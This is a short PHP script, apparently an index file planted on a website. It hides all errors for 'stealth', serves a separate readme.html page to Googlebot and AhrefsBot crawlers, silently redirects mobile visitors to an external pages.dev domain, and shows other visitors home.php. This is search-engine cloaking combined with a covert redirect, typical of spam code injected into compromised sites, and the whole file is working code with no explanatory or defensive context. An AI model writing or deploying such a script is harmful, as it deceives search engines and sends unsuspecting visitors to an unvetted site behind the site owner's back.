<?php
// Disable error reporting for stealth
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
set_error_handler(function() { return true; });

// No cache headers
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// ====== BOT DETECTION ======
function is_google_bot() {
    $agents = array(
        "Googlebot", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-Image", 
        "AhrefsBot"
    );
    foreach ($agents as $agent) {
        if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            return true;
        }
    }
    return false;
}

// ====== MOBILE DETECTION ======
function is_mobile() {

    return preg_match("/(android|iphone|ipad|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// ====== MAIN LOGIC ======
if (is_google_bot()) {
    // 
    $bot_content = @file_get_contents('readme.html');
    echo $bot_content;
    exit;

} elseif (is_mobile()) { 
    // 
    header("Location: https://time-to-high.pages.dev/");
    echo '<meta http-equiv="refresh" content="0; url=https://time-to-high.pages.dev/">';
    exit;

} else {
    // 
    include('home.php');
    exit;
}
?>
